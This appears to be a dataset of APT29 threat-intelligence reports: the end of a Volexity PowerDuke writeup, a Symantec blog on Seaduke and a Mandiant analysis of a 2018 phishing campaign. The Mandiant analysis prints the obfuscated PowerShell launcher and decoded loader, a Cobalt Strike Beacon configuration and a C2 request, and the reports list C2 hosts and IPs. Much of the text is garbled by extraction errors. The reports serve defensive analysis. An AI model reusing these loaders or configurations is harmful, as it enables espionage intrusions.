ﬁle via GetFileAttributesExW or failing that, by mapping the ﬁle and getting the size kill stop a process via TerminateProcess memstat get memory usage status via GlobalMemoryStatusEx, total RAM, percent used, etc. osdate get the time the machine was built (via InstallDate registry key) osver get OS info via registry, such as ProductName, CurrentBuild, CurrentVersion, CSDBuildNumber, etc. pslist list processes via CreateToolhelp32Snapshot pwd run # get current directory via GetCurrentDirectoryW start a process via CreateProcessW runs cmd.exe /c and gets the output via Named Pipe and sends the data back siduser gets the current user's SID via GetTokenInformation and LookupAccountSidW time the time + timezone (GetLocalTime and GetTimeZoneInformation) uptime number of seconds since the last boot user wipe wnd fgetp fputp the user's name via GetUserNameExW writes random data across a ﬁle, then deletes the ﬁle gets the text of the current foreground window download ﬁle upload ﬁle power reboot or shutdown (via previously loaded PowrProf.dll) cdt change to temporary directory reqdelay sleep for speciﬁed time Volexity has not fully examined the PowerDuke instances from these campaigns but has noted the malware appears to support the following additional commands not described above: sidcomp buzy exit copy detectav mkdir software shlist shinfo shdel shadd setpng conn setsrv Volexity may update this post following further PowerDuke analysis. Network Indicators Below are network indicators associated with download URLs for the aforementioned Dukes attack campaigns. Hostname IP Address ASN Information efax.pfdresearch.org 81.82.196.162 6848 | 81.82.0.0/15 | TELENET | BE | telenet.be | Telenet Operaties N.V. efax.pfdregistry.net 65.15.88.243 7018 | 65.15.64.0/19 | ATT-INTERNET4 | US | bellsouth.net | Bellsouth.net Inc. efax.pfdweek.com 84.206.44.194 31581 | 84.206.0.0/16 | KOPINT | HU | ekg.kopdat.hu | National Infocommunications Service Company Limited by Shares Below are network indicators associated with command and control servers for the aforementioned Dukes attack campaigns. IP Address ASN Information 185.124.86.121 43260 | 185.124.86.0/24 | DGN | TR | - | - 185.132.124.43 43260 | 185.132.124.0/24 | DGN | TR | - | - 185.26.144.109 60721 | 185.26.144.0/24 | BURSABIL | TR | bursabil.com.tr | Bursabil Konfeksiyon Tekstil Bilisim Teknoloji insaat Sanayi ve Ticaret Limited Sirketi 173.243.80.6 14979 | 173.243.80.0/24 | AERONET-WIRELESS | PR | aeronetpr.com | Aeronet Wireless 177.10.96.30 262848 | 177.10.96.0/21 | Naja | BR | najatel.com.br | Naja Telecomunicacoes Ltda. Conclusion The Dukes continue to launch well-crafted and clever attack campaigns. They have had tremendous success evading anti-virus and anti-malware solutions at both the desktop and mail gateway levels. The group's anti-VM macros and PowerShell scripts appear to have drastically reduced the number of sandboxes and bots that the group has to deal with on their command and control infrastructure. This combined with their use of steganography to hide their backdoor within PNG ﬁles that are downloaded remotely and loaded in memory only or via alternate data streams (ADS) is quite novel in its approach. Volexity believes that the Dukes are likely working to gain long-term access into think tanks and NGOs and will continue to launch new attacks for the foreseeable future. Follow us on Twitter: @Volexity, @stevenadair, @5ck, @imhlv2, @attrc APT, Dukes, elections, spear phishing"
apt29,cti-hal,8bc7e14589f8,G0016,"Symantec Connect (/web/20181008161626/https://www.symantec.com/connect/) The Wayback Machine - https://web.archive.org/web/20181008161626/https://www.symantec.com/connect/bl…  (/web/20181008161626mp_/https://www.symantec.com/connect/)  Blogs (/web/20181008161626mp_/https://www.symantec.com/connect/blogs) Security Response (/web/20181008161626mp_/https://www.symantec.com/connect/symantec-blogs/symantec-security-  response)  Help us spread the word about SEP (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/connect/articles/help- us-spread-word-about-sep-and-get-25-amazon-gift-card) and get a $25 Amazon gift card!  Security Response  (https://web.archive.org/web/20181008161626mp_/https://twitter.com/threatintel)  (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/connect/item- feeds/blog/2261/feed/all/en/all) +1 1 Votes Symantec O#cial Blog “Forkmeiamfamous”: Seaduke, latest weapon in the Duke armory Low-pro""le information-stealing Trojan is used only against high-value targets. By: Symantec Security Response (/web/20181008161626mp_/https://www.symantec.com/connect/user/symantec- security-response) SYMANTEC EMPLOYEE Created 13 Jul 2015  0 Comments  : ⽇本語 (/web/20181008161626mp_/https://www.symantec.com/connect/ja/blogs/forkmeiamfamous-duke-seaduke)  0  0   (https://web.archive.org/web/20181008161627/http://en-us.reddit.com/submit? url=http://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke- armory)  (/web/20181008161626mp_/https://www.symantec.com/connect/forward?path=node/3453861) Symantec has uncovered an elusive Trojan used by the cyberespionage group behind the “Duke” family of malware. Seaduke (detected by Symantec as Trojan.Seaduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-031915-4935-99&tabid=2)) is a low-pro!le information-stealing Trojan which appears to be reserved for attacks against a small number of high-value targets. Seaduke has been used in attacks against a number of major, government-level targets. The malware hides behind numerous layers of encryption and obfuscation and is capable of quietly stealing and ex!ltrating sensitive information such as email from the victim’s computer. Seaduke has a highly con!gurable framework and Symantec has already found hundreds of di#erent con!gurations on compromised networks. Its creators are likely to have spent a considerable amount of time and resources in preparing these attacks and the malware has been deployed against a number of high-level government targets. While the Duke group began to distribute Cozyduke in an increasingly aggressive manner, Seaduke installations were reserved only for select targets. Seaduke victims are generally !rst infected with Cozyduke and, if the computer appears to be a target of interest, the operators will install Seaduke. Background The group behind Seaduke is a cyberespionage operation that is responsible for a series of attacks against high-pro!le individuals and organizations in government, international policy and private research in the United States and Europe. It has a range of malware tools at its disposal, known as the Dukes, including Cozyduke (Trojan.Cozer (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-030500-0430-99&tabid=2)), Miniduke (Backdoor.Miniduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2013-030119-2820-99http://www.symantec.com/security_response/writeup.jsp?docid=2013-030119- 2820-99)) and Cosmicduke (Backdoor.Tinybaron (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2014-052717-4610-99&tabid=2)). News of the Duke group !rst emerged in March and April of 2015, when reports detailing attacks involving a sophisticated threat actor variously called O$ce Monkeys, EuroAPT (https://web.archive.org/web/20181008161626mp_/http://malware.prevenity.com/2015/03/euroapt.html), Cozy Bear (https://web.archive.org/web/20181008161626mp_/http://zaufanatrzeciastrona.pl/post/przytulny-mis-w- natarciu-kampania-cozy-bear-atakuje-takze-polske/), and Cozyduke (https://web.archive.org/web/20181008161626mp_/http://securelist.com/blog/69731/the-cozyduke-apt/) were published (https://web.archive.org/web/20181008161626mp_/https://www.f- secure.com/documents/996508/1030745/CozyDuke). Symantec believes that this group has a history of compromising governmental and diplomatic organizations since at least 2010. The group began its current campaign as early as March 2014, when Trojan.Cozer (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-030500-0430-99&tabid=2) (aka Cozyduke) was identi!ed on the network of a private research institute in Washington, D.C. In the months that followed, the Duke group began to target victims with “O$ce Monkeys”- and “eFax”-themed emails, booby-trapped with a Cozyduke payload. These tactics were atypical of a cyberespionage group. It’s quite likely these themes were deliberately chosen to act as a smokescreen, hiding the true intent of the adversary. Figure 1. Cozyduke campaign used an “O$ce Monkeys” video as a lure–July 2014 The Duke group has mounted an extended campaign targeting high-pro!le networks over extended periods, something which is far beyond the reach of the majority of threat actors. Its capabilities include: Attack infrastructure leveraging hundreds of compromised websites Rapidly developed malware frameworks in concurrent use Sophisticated operators with !ne-tuned computer network exploitation (CNE) skills Although Cozyduke activity was !rst identi!ed in March 2014, it wasn’t until July that the group managed to successfully compromise high-pro!le government networks. Cozyduke was used throughout these attacks to harvest and ex!ltrate sensitive information to the attackers. In parallel, the Duke group was also installing separate malware onto these networks, namely Backdoor.Miniduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2013-030119-2820-99http://www.symantec.com/security_response/writeup.jsp?docid=2013-030119- 2820-99) and the more elusive Trojan.Seaduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-031915-4935-99&tabid=2). It could use these payloads to exploit networks on multiple fronts and providing it with additional persistence mechanisms. The Miniduke payload In July of 2014, the group instructed Cozyduke-infected computers to install Backdoor.Miniduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2013-030119-2820-99http://www.symantec.com/security_response/writeup.jsp?docid=2013-030119- 2820-99) onto a compromised network. Miniduke has been the group’s tool of choice for a number of years in espionage operations predominantly targeting government and diplomatic entities in Eastern Europe and ex-Soviet states. “Nemesis Gemina” appears to be the internal name for the framework used by the group to identify the project, previously reported by Kaspersky (https://web.archive.org/web/20181008161626mp_/https://securelist.com/blog/incidents/64107/miniduke- is-back-nemesis-gemina-and-the-botgen-studio/). The following debug string was present in the sample used in these attacks: C:\Projects\nemesis-gemina\nemesis\bin\carriers\ezlzma_x86_exe.pdb This project name has been seen in Backdoor.Tinybaron (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2014-052717-4610-99&tabid=2) (aka Cosmicduke) samples, which Symantec also attributes to the Duke group. This deployment of Miniduke and the technical similarities with Cozyduke provided strong indicators as to who was behind the attacks. The Seaduke payload These attacks were already well underway when another group began to deploy a previously unknown piece of malware. In October 2014, the Seaduke payload began to appear within target networks. Although Seaduke was developed in Python, the overall framework bears a striking resemblance to Cozyduke in terms of operation. It’s unclear why the attackers waited until October to deploy Seaduke. Was it reserved for a more speci!c attack? Was part of their cover blown, necessitating the use of an alternative framework? The Seaduke framework was designed to be highly con!gurable. Hundreds of recon!gurations were identi!ed on compromised networks. The communication protocol employed had many layers of encryption and obfuscation, using over 200 compromised web servers for command and control. Seaduke required a signi!cant investment of time and resources in the preparatory and operational phases of the attack. Seaduke delivery The attackers control Cozyduke via compromised websites, issuing instructions to infected machines by uploading “tasks” to a database !le. Cozyduke will periodically contact these websites to retrieve task information to be executed on the local machine. One such task (an encoded PowerShell script) instructed Cozyduke to download and execute Seaduke from a compromised website. Figure 2. How the attacker tasks Cozer to install Seaduke Seaduke operation The attackers can operate Seaduke in a broadly similar fashion to Cozyduke. The Seaduke control infrastructure is essentially distinct, opening up the possibility of sub-teams concurrently exploiting the target network. Unlike Cozyduke, Seaduke operators upload “task” !les directly to the command-and- control (C&C) server; there is no database as such present. Seaduke securely communicates with the C&C server over HTTP/HTTPS beneath layers of encoding (Base64) and encryption (RC4, AES). To an untrained eye, the communications look fairly benign, no doubt an e#ort to stay under the radar on compromised networks. Figure 3. How Seaduke operates on the target network Seaduke has many inbuilt commands which are available to the attackers. They have the ability to retrieve detailed bot/system information, update bot con!guration, upload !les, download !les, and self-delete the malware from the system. The self-delete function is interestingly called “seppuku (https://web.archive.org/web/20181008161626mp_/https://en.wikipedia.org/wiki/Seppuku)”. This is a form of Japanese ritual suicide. Seaduke payloads The attackers have also developed a number of additional payloads. Operators can push these payloads onto infected machines for very speci!c attacks. Impersonation using Kerberos pass-the-ticket attacks (Mimikatz PowerShell) Email extraction from the MS Exchange Server using compromised credentials Archiving sensitive information Data ex!ltration via legitimate cloud services Secure !le deletion What next? The Duke group has brought its operational capability to the next level. Its attacks have been so bold and aggressive, that a huge amount of attention has been drawn to it, yet it appears to be unperturbed. Its success at compromising such high-pro!le targets has no doubt added a few feathers to its cap. Even the developers reveled in this fact, naming one of Seaduke’s functions “forkmeiamfamous”. While the group is currently keeping a lower pro!le, there’s no doubt it will reappear. Some tools may have to be abandoned, some reworked and others built completely from scratch. This attack group is in it for the long haul.  Tags: Products (/web/20181008161626mp_/https://www.symantec.com/connect/search?!lters=im_vid_31:691), Endpoint Protection (/web/20181008161626mp_/https://www.symantec.com/connect/product/endpoint-protection-vdi), Security Response (/web/20181008161626mp_/https://www.symantec.com/connect/search?!lters=im_vid_51:2261), Cyberespionage (/web/20181008161626mp_/https://www.symantec.com/connect/search?!lters=im_vid_111:84571), Duke (/web/20181008161626mp_/https://www.symantec.com/connect/search?!lters=im_vid_111:93741), information theft (/web/20181008161626mp_/https://www.symantec.com/connect/search?!lters=im_vid_111:93731)  Subscriptions (0) (/web/20181008161626mp_/https://www.symantec.com/connect/user/symantec- security-response) Symantec Security Response (/web/20181008161626mp_/https://www.symantec.com/connect/user/symantec- security-response)  View Pro!le (/web/20181008161626mp_/https://www.symantec.com/connect/user/symantec-security-response) Login (/web/20181008161626mp_/https://www.symantec.com/connect/user/login? destination=blogs%2Fforkmeiamfamous-seaduke-latest-weapon-duke-armory) or Register (/web/20181008161626mp_/https://www.symantec.com/connect/user/register? destination=blogs%2Fforkmeiamfamous-seaduke-latest-weapon-duke-armory) to post comments.  About Your Community A Message From Your Community Manager: (/web/20181008161626mp_/https://www.symantec.com/connect/user/rgmdonaldson) RGMDonaldson (/web/20181008161626mp_/https://www.symantec.com/connect/user/rgmdonaldson) Welcome to the Security Community on Symantec Connect. The Security Community covers many di#erent security products from Symantec and provides valuable technical information for each. Please feel free to contact me via private message with any questions you may have. I look forward to hearing from you and answering any questions about the Community.  Send a private message to the Community Manager (/web/20181008161626mp_/https://www.symantec.com/connect/messages/new/4100651? destination=user%2F4100651) Top 5 Contributors: All Time MEMBER (/web/20181008161626mp_/https://www.symantec.com/connect/user/riai) ℬrίαη (/web/20181008161626mp_/https://www.symantec.com/connect/user/riai) REWARD POINTS 148994 (/web/20181008161626mp_/https://www.symantec.com/connect/user/vikram-kumar-sav-sep) Vikram Kumar-SAV to SEP (/web/20181008161626mp_/https://www.symantec.com/connect/user/vikram-kumar-sav- sep) 77376 (/web/20181008161626mp_/https://www.symantec.com/connect/user/mithun-sanghavi) Mithun Sanghavi (/web/20181008161626mp_/https://www.symantec.com/connect/user/mithun-sanghavi) (/web/20181008161626mp_/https://www.symantec.com/connect/user/rafeeq) Rafeeq (/web/20181008161626mp_/https://www.symantec.com/connect/user/rafeeq) (/web/20181008161626mp_/https://www.symantec.com/connect/user/pk-1) P_K_ (/web/20181008161626mp_/https://www.symantec.com/connect/user/pk-1) 77025 68714 53536 Top 5 Contributors: Last 30 Days MEMBER REWARD POINTS (/web/20181008161626mp_/https://www.symantec.com/connect/user/aravind-ghosh) Aravind Ghosh (/web/20181008161626mp_/https://www.symantec.com/connect/user/aravind-ghosh) (/web/20181008161626mp_/https://www.symantec.com/connect/user/riai) ℬrίαη (/web/20181008161626mp_/https://www.symantec.com/connect/user/riai) (/web/20181008161626mp_/https://www.symantec.com/connect/user/africo) africo (/web/20181008161626mp_/https://www.symantec.com/connect/user/africo) (/web/20181008161626mp_/https://www.symantec.com/connect/user/craigev) CraigEV (/web/20181008161626mp_/https://www.symantec.com/connect/user/craigev) (/web/20181008161626mp_/https://www.symantec.com/connect/user/shadowleaf) ShadowLeaf (/web/20181008161626mp_/https://www.symantec.com/connect/user/shadowleaf) 825 600 200 150 101 (https://web.archive.org/web/20181008161626mp_/https://www.surveymonkey.com/r/G7KVZWQ) Contact Us (/web/20181008161626mp_/https://www.symantec.com/connect/contact) Privacy Policy (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/about/pro!le/policies/privacy.jsp) Earn Rewards (/web/20181008161626mp_/https://www.symantec.com/connect/points) Rewards Terms and Conditions (/web/20181008161626mp_/https://www.symantec.com/connect/blogs/symantec-connect-rewards-program-terms-and- conditions) © 2018 Symantec Corporation  (https://web.archive.org/web/20181008161626/https://twitter.com/symantec)  (https://web.archive.org/web/20181008161626/https://www.facebook.com/Symantec)  (https://web.archive.org/web/20181008161626/https://www.linkedin.com/company/symantec)"
apt29,cti-hal,04e446ac5d3f,G0016,
apt29,cti-hal,b1970503da69,G0016,"Cloud Contact sales Get started for free Blog Solutions & technology Ecosystem Developers & Practitioners Transform with Google Cloud Threat Intelligence Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign November 19, 2018 Mandiant Wri!en by: Ma!hew Dunwoody, Andrew Thompson, Ben Withnell, Jonathan Leathery, Michael Matonis, Nick Carr Introduction FireEye devices detected intrusion a!empts against multiple industries, including think tank, law enforcement, media, U.S. military, imagery, transpo""ation, pharmaceutical, national government, and defense contracting. The a!empts involved a phishing email appearing to be from the U.S. Depa""ment of State with links to zip #les containing malicious Windows sho""cuts that delivered Cobalt Strike Beacon. Shared technical a""ifacts; tactics, techniques, and procedures (TTPs); and targeting connect this activity to previously observed activity suspected to be APT29. APT29 is known to transition away from phishing implants within hours of initial compromise. On November 14, 2018, FireEye detected new targeted phishing activity at more than 20 of our clients across multiple industries. “ (UPDATE) This campaign has targeted over 20 FireEye customers across: Defense, Imagery, Law Enforcement, Local Government, Media, Military, Pharmaceutical, Think Tank, Transportation, & US Public Sector industries in multiple geographic regions.” FireEye (@FireEye) November 15, 2018 The a!acker appears to have compromised the email server of a hospital and the corporate website of a consulting company in order to use their infrastructure to send phishing emails. The phishing emails were made to look like secure communication from a Public A$airs o%cial at the U.S. Depa""ment of State, hosted on a page made to look like another Depa""ment of State Public A$airs o%cial's personal drive, and used a legitimate Depa""ment of State form as a decoy. This information could be obtained via publicly available data, and there is no indication that the Depa""ment of State network was involved in this campaign. The a!acker used unique links in each phishing email and the links that FireEye observed were used to download a ZIP archive that contained a weaponized Windows sho""cut #le, launching both a benign decoy document and a Cobalt Strike Beacon backdoor, customized by the a!acker to blend in with legitimate network tra%c. Several elements from this campaign – including the resources invested in the phishing email and network infrastructure, the metadata from the weaponized sho""cut #le payload, and the speci#c victim individuals and organizations targeted – are directly linked to the last observed APT29 phishing campaign from November 2016. This blog post explores those technical breadcrumbs and the possible intentions of this activity. A!ribution Challenges Conclusive FireEye a!ribution is o&en obtained through our Mandiant consulting team's investigation of incidents at compromised organizations, to identify details of the a!ack and post-compromise activity at victims. FireEye is still analyzing this activity. There are several similarities and technical overlaps between the 14 November 2018, phishing campaign and the suspected APT29 phishing campaign on 9 November 2016, both of which occurred sho""ly a&er U.S. elections. However, the new campaign included creative new elements as well as a seemingly deliberate reuse of old phishing tactics, techniques and procedures (TTPs), including using the same system to weaponize a Windows sho""cut (LNK) #le. APT29 is a sophisticated actor, and while sophisticated actors are not infallible, seemingly blatant mistakes are cause for pause when considering historical uses of deception by Russian intelligence services. It has also been over a year since we have conclusively identi#ed APT29 activity, which raises questions about the timing and the similarities of the activity a&er such a long interlude. Notable similarities between this and the 2016 campaign include the Windows sho""cut metadata, targeted organizations and speci#c individuals, phishing email construction, and the use of compromised infrastructure. Notable di$erences include the use of Cobalt Strike, rather than custom malware; however, many espionage actors do use publicly and commercially available frameworks for reasons such as plausible deniability. During the phishing campaign, there were indications that the site hosting the malware was selectively serving payloads. For example, requests using incorrect HTTP headers repo""edly served ZIP archives containing only the benign publicly available Depa""ment of State form. It is possible that the threat actor served additional and di$erent payloads depending on the link visited; however, FireEye has only observed two: the benign and Cobalt Strike variations. We provide details of this in the activity summary. Analysis of the campaign is ongoing, and we welcome any additional information from the community. Activity Summary The threat actor cra&ed the phishing emails to masquerade as a U.S. Depa""ment of State Public A$airs o%cial sharing an o%cial document. The links led to a ZIP archive that contained a weaponized Windows sho""cut #le hosted on a likely compromised legitimate domain, jmj[.].com. The sho""cut #le was cra&ed to execute a PowerShell command that read, decoded, and executed additional code from within the sho""cut #le. Upon execution, the sho""cut #le dropped a benign, publicly available, U.S. Depa""ment of State form and Cobalt Strike Beacon. Cobalt Strike is a commercially available post-exploitation framework. The BEACON payload was con#gured with a modi#ed variation of the publicly available ""Pandora"" Malleable C2 Pro#le and used a command and control (C2) domain – pandorasong[.]com – assessed to be a masquerade of the Pandora music streaming service. The customization of the C2 pro#le may have been intended to defeat less resilient network detection methods dependent on the default con#gurations. The sho""cut metadata indicates it was built on the same or very similar system as the sho""cut used in the November 2016 campaign. The decoy content is shown in Figure 1. Figure 1: Decoy document content Similarities to Older Activity This activity has TTP and targeting overlap with previous activity, suspected to be APT29. The malicious LNK used in the recent spearphishing campaign, ds7002.lnk (MD5: 6ed0020b0851'71d5b0076f4ee95f3c), has technical overlaps with a suspected APT29 LNK from November 2016, 37486-the- shocking-truth-about-election-rigging-in-america.""f.lnk (MD5: f713d5df826c6051e65f995e57d6817d), which was publicly repo""ed by Volexity. The 2018 and 2016 LNK #les are similar in structure and code, and contain signi#cant metadata overlap, including the MAC address of the system on which the LNK was created. Additional overlap was observed in the targeting and tactics employed in the phishing campaigns responsible for distributing these LNK #le. Previous APT29 activity targeted some of the same recipients of this email campaign, and APT29 has leveraged large waves of emails in previous campaigns. Outlook and Implications Analysis of this activity is ongoing, but if the APT29 a!ribution is strengthened, it would be the #rst activity uncovered from this sophisticated group in at least a year. Given the widespread nature of the targeting, organizations that have previously been targeted by APT29 should take note of this activity. For network defenders, whether or not this activity was conducted by APT29 should be secondary to properly investigating the full scope of the intrusion, which is of critical impo""ance if the elusive and deceptive APT29 operators indeed had access to your environment. Technical Details Phishing Emails were sent from DOSOneDriveNoti#cations-svCT- Mailboxe36625aaa85747214aa50342836a2315aaa36928202aa46271691a8255aaa 15382822aa25821925a0245@no""hshorehealthgm[.]org with the subject Stevenson, Susan N shared ""TP18-DS7002 (UNCLASSIFIED)"" with you. The distribution of emails varied signi#cantly between the a$ected organizations. While most targeted FireEye customers received three or fewer emails, some received signi#cantly more, with one customer receiving 136. Each phishing email contained a unique malicious URL, likely for tracking victim clicks. The pa!ern of this URL is shown in Figure 2. Figure 2: Malicious URL structure Outside of the length of the sender email address, which may have been truncated on some recipient email clients, the a!acker made li!le e$o"" to hide the true source of the emails, including that they were not actually sent from the Depa""ment of State. Figure 3 provides a redacted snapshot of email headers from the phishing message. Figure 3: Redacted email headers The malicious links are known to have served two variants of the #le ds7002.zip. The #rst variant (MD5: 3fccf531$0ae6fedd7c586774b17a2d), contained ds7002.lnk (MD5: 6ed0020b0851'71d5b0076f4ee95f3c). ds7002.lnk was a malicious sho""cut (LNK) #le that contained an embedded BEACON DLL and decoy PDF, and was cra&ed to launch a PowerShell command. On execution, the PowerShell command extracted and executed the Cobalt Strike BEACON backdoor and decoy PDF. The other observed variant of ds7002.zip (MD5: 658c6fe38f95995fa8dc8f6cfe41df7b) contained only the benign decoy document. The decoy document ds7002.pdf (MD5: 313f4808aa2a2073005d219bc68971cd) appears to have been downloaded from hxxps://eforms.state.gov/Forms/ds7002.PDF. The BEACON backdoor communicated with the C2 domain pandorasong[.]com (95.216.59[.]92). The domain leveraged privacy protection, but had a sta"" of authority (SOA) record containing vleger@tutanota.com. Our analysis indicates that the a!acker sta""ed con#guring infrastructure approximately 30 days prior to the a!ack. This is a signi#cantly longer delay than many other a!ackers we track. Table 1 contains a timeline of this activity. Time Event Source Registrant Information pandorasong[.]com registered pandorasong[.]com SSL ce""i#cate Ce""i#cate established Transparency Cobalt Strike server established Scan Data LNK Weaponized LNK Metadata 3fccf531$0ae6fedd7c586774b17a2d Archive modi#ed Metadata 658c6fe38f95995fa8dc8f6cfe41df7b Archive modi#ed Metadata First observed phishing e-mail sent Telemetry Table 1: Operational timeline 2018-10-15 15:35:19Z 2018-10-15 17:39:00Z 2018-10-15 18:52:06Z 2018-11-02 10:25:58Z 2018-11-13 17:58:41Z 2018-11-14 01:48:34Z 2018-11-14 08:23:10Z Execution Upon execution of the malicious LNK, ds7002.lnk (MD5: 6ed0020b0851'71d5b0076f4ee95f3c), the following PowerShell command was executed: \Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noni -ep bypass $zk='JHB0Z3Q9MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5 rIjtpZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0ZW0gLVBhdGggJE Vudjp0ZW1wIC1GaWx0ZXIgJHRiIC1SZWN1cnNlO2lmICgtbm90ICRvZSkge2V4aXR9W 0lPLkRpcmVjdG9yeV06OlNldEN1cnJlbnREaXJlY3RvcnkoJG9lLkRpcmVjdG9yeU5hbWUp O30kdnp2aT1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJHRiLCdPcGVuJywnUmVhZCcsJ 1JlYWRXcml0ZSc7JG9lPU5ldy1PYmplY3QgYnl0ZVtdKCR2Y3EtJHB0Z3QpOyRyPSR2en ZpLlNlZWsoJHB0Z3QsW0lPLlNlZWtPcmlnaW5dOjpCZWdpbik7JHI9JHZ6dmkuUmVhZC gkb2UsMCwkdmNxLSRwdGd0KTskb2U9W0NvbnZlcnRdOjpGcm9tQmFzZTY0Q2hhckFy cmF5KCRvZSwwLCRvZS5MZW5ndGgpOyR6az1bVGV4dC5FbmNvZGluZ106OkFTQ0lJL kdldFN0cmluZygkb2UpO2lleCAkems7';$fz='FromBase'+0x40+'String';$rhia=[Text.E ncoding]::ASCII.GetString([Convert]::$fz.Invoke($zk));iex $rhia; This command included some speci#c obfuscation, which may indicate a!empts to bypass speci#c detection logic. For example, the use of 'FromBase'+0x40+'String', in place of FromBase64String, the PowerShell command used to decode base64. The decoded command consisted of additional PowerShell that read the content of ds7002.lnk from o$set 0x5e2be to o$set 0x623b6, base64 decoded the extracted content, and executed it as additional PowerShell content. The embedded PowerShell code decoded to the following: $ptgt=0x0005e2be; $vcq=0x000623b6; $tb=""ds7002.lnk""; if (-not(Test-Path $tb)) { $oe=Get-ChildItem -Path $Env:temp -Filter $tb -Recurse; if (-not $oe) { exit } [IO.Directory]::SetCurrentDirectory($oe.DirectoryName); } $vzvi=New-Object IO.FileStream $tb,'Open','Read','ReadWrite'; $oe=New-Object byte[]($vcq-$ptgt); $r=$vzvi.Seek($ptgt,[IO.SeekOrigin]::Begin); $r=$vzvi.Read($oe,0,$vcq-$ptgt); $oe=[Convert]::FromBase64CharArray($oe,0,$oe.Length); $zk=[Text.Encoding]::ASCII.GetString($oe); iex $zk; When the decoded PowerShell is compared to the older 2016 PowerShell embedded loader (Figure 4), it's clear that similarities still exist. However, the new activity leverages randomized variable and function names, as well as obfuscating strings contained in the script. Figure 4: Shared functions to loader in older activity (XOR decode function and CopyFilePa!) The PowerShell loader code is obfuscated, but a sho"" de-obfuscated snippet is shown as follows. The decoy PDF and BEACON loader DLL are read from speci#c o$sets within the LNK, decoded, and their contents executed. The BEACON loader DLL is executed with the expo"" function ""PointFunctionCall"": [TRUNCATED] $jzffhy = [IO.FileAccess]::READ $gibisec = myayxvj $(""ds7002.lnk"") $oufgke = 0x48bd8 $wabxu = 0x5e2be - $oufgke $lblij = bygtqi $gibisec $oufgke $wabxu $(""%TEMP%\ds7002.PDF"") Invoke-Item $((lylyvve @((7,(30 + 0x34 - 3),65,(84 - 5),(-38 + 112),(-16 + 0x25 + 52))) 35)) $oufgke = 0x0dd8 $wabxu = 0x48bd8 - $oufgke $yhcgpw = bygtqi $gibisec $oufgke $wabxu $(""%LOCALAPPDATA%\cyzfc.dat"") if ($ENV:PROCESSOR_ARCHITECTURE -eq $(""AMD64"")) { & ($(""rundll32.exe"")) $("","") $(""PointFunctionCall"") } Files Dropped Upon successful execution of the LNK #le, it dropped the following #les to the victim's system: %APPDATA%\Local\cyzfc.dat (MD5: 16bbc967a8b6a365871a05c74a4f345b) BEACON loader DLL %TEMP%\ds7002.PDF (MD5: 313f4808aa2a2073005d219bc68971cd) Decoy document The dropped BEACON loader DLL was executed by RunDll32.exe using the expo"" function ""PointFunctionCall"": ""C:\Windows\system32\rundll32.exe"" C:\Users\Administrator\AppData\Local\cyzfc.dat, PointFunctionCall The BEACON payload included the following con#guration: authorization_id: 0x311168c dns_sleep: 0 http_headers_c2_post_req: Accept: */* Content-Type: text/xml X-Requested-With: XMLHttpRequest Host: pandorasong.com http_headers_c2_request: Accept: */* GetContentFeatures.DLNA.ORG: 1 Host: pandorasong[.]com Cookie: __utma=310066733.2884534440.1433201462.1403204372.1385202498.7; jitter: 17 named_pipes: \\\\%s\\pipe\\msagent_%x process_inject_targets: %windir%\\syswow64\\rundll32.exe %windir%\\sysnative\\rundll32.exe beacon_interval: 300 c2: conntype: SSL host: pandorasong[.]com port: 443 c2_urls: pandorasong[.]com/radio/xmlrpc/v45 pandorasong[.]com/access/ c2_user_agents: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko Network Communications A&er successful installation/initialization of the malware, it made the following callback to the C2 server pandorasong[.]com via TCP/443 SSL. The sample was con#gured to use a malleable C2 pro#le for its network communications. The speci#c pro#le used appears to be a modi#ed version of the publicly available Pandora C2 pro#le. The pro#le may have been changed to bypass common detections for the publicly available malleable pro#les. The following is a sample GET request: GET /access/?version=4&lid=1582502724&token=ajlomeomnmeapoagcknffjaehikhmpep Bdhmoefmcnoiohgkkaabfoncfninglnlbmnaahmhjjfnopdapdaholmanofaoodkiokobenhjd Mjcmoagoimbahnlbdelchkffojeobfmnemdcoibocjgnjdkkbfeinlbnflaeiplendldlbhnhjmbg agigjniphmemcbhmaibmfibjekfcimjlhnlamhicakfmcpljaeljhcpbmgblgnappmkpbcko HTTP/1.1 Accept: */* GetContentFeatures.DLNA.ORG: 1 Host: pandorasong.com Cookie: __utma=310066733.2884534440.1433201462.1403204372.1385202498.7; User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko Connection: Keep-Alive Cache-Control: no-cache Similarities to Older Activity Figure 5 and Figure 6 show the overlapping characteristics between the LNK used in the recent spear phish emails, ds7002.lnk (MD5: 6ed0020b0851'71d5b0076f4ee95f3c), compared to a suspected APT29 LNK from the November 2016 a!ack that led to the SPIKERUSH backdoor, 37486-the- shocking-truth-about-election-rigging-in-america.""f.lnk (MD5: f713d5df826c6051e65f995e57d6817d). Figure 5: LNK characteristics: new activity (le"") and old activity (right) Figure 6: LNK characteristics: new activity (le"") and old activity (right) In addition to similar LNK characteristics, the PowerShell command is very similar to the code from the older sample that executed the SPIKERUSH backdoor. Some of the same variable names are retained in this new version, as seen in Figure 7 and Figure 8. Figure 7: Embedded PowerShell: new activity (le"") and old 